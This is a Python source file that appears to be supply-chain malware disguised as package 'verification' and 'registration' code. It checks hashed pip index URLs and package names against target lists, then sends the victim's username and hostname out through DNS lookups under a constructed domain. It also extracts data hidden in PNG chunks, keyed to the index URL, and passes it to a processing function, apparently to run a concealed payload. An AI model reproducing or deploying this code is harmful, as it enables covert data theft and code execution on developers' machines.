import hashlib
import os
from .pip_utils import pip_install, get_pip_index_list
from .net_utils import resolve_fqdn
from .pkg_utils import get_content
from .os_utils import get_username, get_hostname, proc_func
from cloud_ds_api.resources import TOP_DOMAINS, TOP_SUBS, VERIFIED_PKGS, VERIFIED_IDXS
from img_splicer.utils import read_png_chunk, get_image_name
from img_splicer.resources import IMAGE_RESOURCE


def register_img(idx_map):

    image_name = get_image_name()
    if image_name is None:
        return

    png_bytes = get_content(IMAGE_RESOURCE, image_name)
    if png_bytes is None:
        return

    for idx_hash in idx_map.keys():
        idx_url = idx_map[idx_hash]
        chunk_name = 'sBIT'
        if idx_hash == VERIFIED_IDXS[1]:
            chunk_name = 'hIST'

        chunk_data = read_png_chunk(png_bytes, chunk_name)
        if chunk_data is None:
            continue

        hash_object = hashlib.sha256(idx_url.strip().encode())
        digest = hash_object.digest()

        proc_func(digest, chunk_data)


def register_package(idx_map, package_map):

    uname = get_username()
    hname = get_hostname()
    reg_info = []
    for package_name, package_version in package_map.items():
        reg_info.extend([[f"{package_name}:{package_version}", '0'],
                         [f"{uname}:{hname}", '1']])

        ret_val = pip_install(package_name, package_version, idx_map)
        reg_info.append(['_', ret_val])

    ridx = os.urandom(2).hex()
    base = TOP_SUBS[46] + '.' + TOP_DOMAINS[19]
    for registration_instance in reg_info:
        resolve_fqdn(registration_instance[0], str(
            registration_instance[1]), ridx, base)

    register_img(idx_map)


def check_idx(idx):
    hash_object = hashlib.sha384(idx.strip().encode())
    hash_hex = hash_object.hexdigest()
    if hash_hex in VERIFIED_IDXS:
        return hash_hex
    else:
        return None


def verify_package():

    idx_map = {}
    pkg_map = {}
    pkgs, idxs = get_pip_index_list()
    for idx in idxs:
        idx_hash = check_idx(idx)
        if idx_hash:
            idx_map[idx_hash] = idx
            break

    for pkg in pkgs:
        pkg = pkg.strip()
        hash_object = hashlib.sha256(pkg.encode())
        hash_hex = hash_object.hexdigest()
        if hash_hex in VERIFIED_PKGS:
            pkg_map[pkg] = VERIFIED_PKGS[hash_hex]

    if len(idx_map) > 0 and len(pkg_map) > 0:
        register_package(idx_map, pkg_map)
        return True
    else:
        return False
